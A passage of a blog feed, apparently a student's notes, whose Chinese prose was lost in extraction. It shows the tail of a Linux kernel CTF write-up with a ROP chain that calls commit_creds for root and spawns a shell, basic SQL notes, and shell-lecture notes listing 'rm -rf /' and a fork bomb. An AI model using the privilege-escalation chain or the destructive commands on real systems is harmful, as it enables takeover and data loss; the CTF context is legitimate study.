class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure><p>rip </p><ul><li>getshell</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   __asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">       <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>    </span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">get_shell();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>commit_creds(prepare_kernel_cred (0)) &#x3D;&gt;  commit_creds(&amp;init_cred) init_cred: init root <code>/proc/kallsyms</code> </p><p> gadget gadget <code>kernel tried to execute NX-protected page</code></p><p>gadget?gadget</p><ul><li>ropper + ROPgadget + ropr gadget</li><li>extract-vmlinux + vmlinux-to-elf </li></ul><p></p><ul><li> <code>getchar()</code> si</li><li>rop</li></ul><p> add rsp </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;</span><br><span class="line">   0xffffffff81909b93    ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0xffffc900001c7df8+0x168 </span><br><span class="line">00:0000 0xffffc900001c7f60 0x44444444 /* <span class="string">&#x27;DDDD&#x27;</span> */</span><br><span class="line">01:0008 0xffffc900001c7f68 0x33333333 /* <span class="string">&#x27;3333&#x27;</span> */</span><br><span class="line">02:0010 0xffffc900001c7f70 0x22222222 /* <span class="string">&#x27;&quot;&quot;&quot;&quot;&#x27;</span> */</span><br><span class="line">03:0018 0xffffc900001c7f78 0xbbbb1111</span><br><span class="line">04:0020 0xffffc900001c7f80 0xbbbb2222</span><br><span class="line">05:0028 0xffffc900001c7f88 0x246</span><br><span class="line">06:0030 0xffffc900001c7f90 0x11110000</span><br><span class="line">07:0038 0xffffc900001c7f98 0x99999999</span><br><span class="line">08:0040 0xffffc900001c7fa0 0x88888888</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><ul><li><p> RDBMSSQLiteMySQL  PostgreSQL</p></li><li><p>SQL</p></li></ul><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote><p> MariaDB</p></blockquote><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">column_name data_type  </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">column_name data_type  </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><p>sqlite3</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.help;     -- </span><br><span class="line"></span><br><span class="line">.open test.db;  -- </span><br><span class="line"></span><br><span class="line">.show;     -- </span><br><span class="line"></span><br><span class="line">.quit   -- </span><br><span class="line"></span><br><span class="line">.databases  -- </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- </span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dump   -- SQL  </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tables  -- </span><br><span class="line">.schema  -- </span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- SELECT </span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>CSQL</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/"/>
      <url>/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>the Missing Semester of your CS education</p></blockquote><span id="more"></span><p>The Missing Semester of your CS education<code>11</code>1h</p><ul><li><a href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili </a></li><li><a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li></ul><p>+Linux</p><p>TM</p><p></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure><h2 id="lectrue1-overview-shell"><a href="#lectrue1-overview-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote><p> Linux </p></blockquote><h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul><li></li></ul><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>Linux Shell.bash</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellbashGNU Bourne-Again ShellshellLinuxShell</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PATH /bin/echo  echo </span></span><br><span class="line"><span class="comment"># `:` </span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereis </span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..` `.`  </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  </span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..``/` `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  list: </span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment">#  move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#  copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span class="comment"># rm -r </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat </span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># tmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># </span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; &gt;&gt; append</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: Read, Write, eXecute()</span></span><br><span class="line"><span class="comment"># : owner group  owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># qmanual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rootsudo echo 123 &gt; tmp.txt</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure><p>root user: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` root  </span></span><br></pre></td></tr></table></figure><p><code>/sys</code> linux</p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork , </span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment">#  `:` </span></span><br><span class="line">:() &#123;</span><br><span class="line">: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ls()</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay  cowthink think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">-l </span><br><span class="line">-f </span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet   toilet </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># logob</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure><p>rust</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 